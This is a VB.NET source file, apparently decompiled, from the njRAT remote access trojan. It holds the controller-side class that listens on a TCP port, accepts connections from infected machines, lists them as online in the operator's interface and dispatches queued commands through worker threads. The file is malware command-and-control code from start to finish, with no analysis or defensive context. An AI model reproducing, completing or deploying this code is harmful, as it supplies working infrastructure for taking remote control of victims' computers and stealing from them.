Imports Microsoft.VisualBasic
Imports Microsoft.VisualBasic.CompilerServices
Imports System
Imports System.Collections.Generic
Imports System.Diagnostics
Imports System.Drawing
Imports System.Net.Sockets
Imports System.Runtime.CompilerServices
Imports System.Threading

Namespace njRAT
    Public Class SK
        ' Methods
        Public Sub New(ByVal port As Integer)
            Me.S = New TcpListener(port)
            Me.S.Server.SendTimeout = -1
            Me.S.Server.ReceiveTimeout = -1
            Me.S.Server.SendBufferSize = &H80000
            Me.S.Server.ReceiveBufferSize = &H80000
            Me.S.Start(&H270F)
            ThreadPool.SetMinThreads(250, 250)
            ThreadPool.SetMaxThreads(250, 250)
            Me.Online = New Collection
            Me.REQ = New List(Of GClass12)
            Dim num As Integer = 0
            Do
                Me.S.BeginAcceptTcpClient(New AsyncCallback(AddressOf Me.accept), Nothing)
                num += 1
            Loop While (num <= 10)
            Dim parameter As Integer = 1
            Do
                Dim sukk As New Threading.Thread(New ParameterizedThreadStart(AddressOf Me.lam__7))
                sukk.Start(parameter)
                parameter += 1
            Loop While (parameter <= &H10)
        End Sub
        Private Sub lam__7(ByVal object_0 As Object)
            Me.tp(Conversions.ToInteger(object_0))
        End Sub

        Public Sub accept(ByVal ar As IAsyncResult)
            Try
                Dim item As Client = New Client(Me.S.EndAcceptTcpClient(ar), Me)
                item.Client.ReceiveTimeout = -1
                item.Client.SendTimeout = -1
                item.Client.SendBufferSize = 524288
                item.Client.ReceiveBufferSize = 524288
                If Class7.class8_0.bool_2 Then
                    Class7.form1_0.Pp1.WRT(New Object() {Color.LightSteelBlue, Class6.smethod_13, item.COI, Color.GreenYellow, item.ip, "Connected"})
                End If
                Dim online As Collection = Me.Online
                SyncLock online
                    Me.Online.Add(item, item.ip, Nothing, Nothing)
                End SyncLock
            Catch exception1 As Exception
            End Try
            Thread.Sleep(1)
            Me.S.BeginAcceptTcpClient(New AsyncCallback(AddressOf Me.accept), Nothing)
        End Sub

        Public Function GetClient(ByVal ID As String) As Client
            Dim client As Client
            Dim online As Collection = Me.Online
            Monitor.Enter(online)
            Try
                client = DirectCast(Me.Online.Item(ID), Client)
            Catch exception1 As Exception
                client = Nothing
            Finally
                Monitor.Exit(online)
            End Try
            Return client
        End Function

        Public Sub tp(ByVal i As Integer)
            Do While True
                Thread.Sleep(1)
                Dim class2 As GClass12 = Nothing
                Dim rEQ As List(Of GClass12) = Me.REQ
                SyncLock rEQ
                    If (Me.REQ.Count > 0) Then
                        class2 = Me.REQ.Item(0)
                        Me.REQ.RemoveAt(0)
                    End If
                End SyncLock
                If (Not class2 Is Nothing) Then
                    Class7.smethod_5(New Object() {class2.client_0, class2.byte_0})
                    class2.bool_0 = True
                End If
            Loop
        End Sub


        ' Fields
        Private bool_0 As Boolean = False
        Public Online As Collection = New Collection
        Public REQ As List(Of GClass12)
        Public S As TcpListener
    End Class
End Namespace


